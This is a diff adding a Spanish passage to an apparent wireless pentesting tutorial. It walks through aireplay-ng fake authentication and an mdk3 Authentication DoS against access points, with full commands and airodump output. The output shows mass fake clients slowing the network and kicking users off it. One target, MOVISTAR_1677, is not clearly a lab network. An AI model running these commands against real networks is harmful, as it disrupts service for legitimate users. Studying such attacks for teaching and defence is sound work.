@@ -785,6 +785,141 @@ dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta 
 que la red comenzaría a ir lenta, llegando al punto en el que seríamos expulsados de esta hasta detener el
 ataque.
 
+Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro '**-1**' de aireplay:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #echo; aireplay-ng --help | tail -n 13 | grep "\-1" | sed '/^\s*$/d' | sed 's/^ *//'; echo
+
+--fakeauth    delay : fake authentication with AP (-1)
+```
+
+Imaginemos que tenemos este escenario:
+
+```bash
+ CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
+                                                                                                                                                                                       
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                                       
+ 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
+                                                                                                                                                                                       
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
+                                                                                                                                                                                       
+ (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
+ (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                
+```
+
+Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación haciendo uso de nuestra tarjeta de red
+como estación:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
+21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
+Found BSSID "1C:B0:44:D4:16:78" to given ESSID "MOVISTAR_1677".
+
+21:20:28  Sending Authentication Request (Open System) [ACK]
+21:20:28  Authentication successful
+21:20:28  Sending Association Request
+
+21:20:33  Sending Authentication Request (Open System) [ACK]
+21:20:33  Authentication successful
+21:20:33  Sending Association Request
+
+21:20:38  Sending Authentication Request (Open System) [ACK]
+21:20:38  Authentication successful
+21:20:38  Sending Association Request [ACK]
+21:20:38  Association successful :-) (AID: 1)
+```
+
+Con el parámetro '**-h**', especificamos la dirección MAC del falso cliente a autenticar. Si volvemos a
+analizar ahora la red inalámbrica, podremos ver que nuestra tarjeta de red figura como cliente:
+
+```bash
+ CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
+                                                                                                                                                                                       
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                                       
+ 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
+                                                                                                                                                                                       
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
+                                                                                                                                                                                       
+ (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
+ (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     
+ 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
+```
+
+Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
+gracia, estaríamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engañar al router,
+haciéndole creer que dispone de ese cliente asociado.
+
+A efectos prácticos, por el momento esto no genera ningún inconveniente, ¿cómo autenticamos por tanto ahora a
+5.000 clientes?. Podríamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
+aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, **mdk3**.
+
+A través de la utilidad **mdk3**, tenemos un modo de ataque '**Authentication DoS Mode** que se encarga de
+asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:
+
+* mdk3 wlan0mon a -a bssidAP
+
+Veámoslo en la práctica, aplicamos el comando por un lado:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar]
+└──╼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab
+```
+
+Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:
+
+```bash
+ CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         
+                                                                                         
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                         
+ 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
+                                                                                         
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
+                                                                                         
+ (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       
+ 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       
+ 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
+ 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
+```
+
+Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
+casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
+los clientes más lejanos o con poca señal WiFi.
+
 
 
 
